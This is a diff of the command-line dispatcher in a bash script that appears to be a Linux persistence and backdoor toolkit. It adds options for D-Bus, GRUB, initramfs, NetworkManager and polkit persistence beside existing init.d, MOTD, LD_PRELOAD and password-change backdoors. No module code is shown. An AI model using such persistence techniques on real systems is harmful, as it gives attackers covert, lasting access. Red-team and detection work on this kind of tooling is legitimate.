@@ -81,6 +81,11 @@ main() {
 				setup_cron "$@"
 				exit
 				;;
+			--dbus )
+				shift
+				setup_dbus "$@"
+				exit
+				;;
 			--generator )
 				shift
 				setup_generator_persistence "$@"
@@ -91,9 +96,19 @@ main() {
 				setup_git_persistence "$@"
 				exit
 				;;
+			--grub )
+				shift
+				setup_grub "$@"
+				exit
+				;;
 			--initd )
 				shift
 				setup_initd_backdoor "$@"
+				exit
+				;;
+			--initramfs )
+				shift
+				setup_initramfs "$@"
 				exit
 				;;
 			--ld-preload )
@@ -121,6 +136,11 @@ main() {
 				setup_motd_backdoor "$@"
 				exit
 				;;
+			--network-manager )
+				shift
+				setup_network_manager "$@"
+				exit
+				;;
 			--package-manager )
 				shift
 				setup_package_manager_persistence "$@"
@@ -139,6 +159,11 @@ main() {
 			--password-change )
 				shift
 				setup_password_change "$@"
+				exit
+				;;
+			--polkit )
+				shift
+				setup_polkit "$@"
 				exit
 				;;
 			--rc-local )
@@ -227,7 +252,7 @@ main() {
 
 				if type "$MODULE_NAME" &>/dev/null; then
 					echo ""
-					echo "######################### [+] Reverting $1 module... #########################"
+					echo "################## [+] Reverting $1 module... "##################
 					echo ""
 					$MODULE_NAME  # Execute the function
 				else
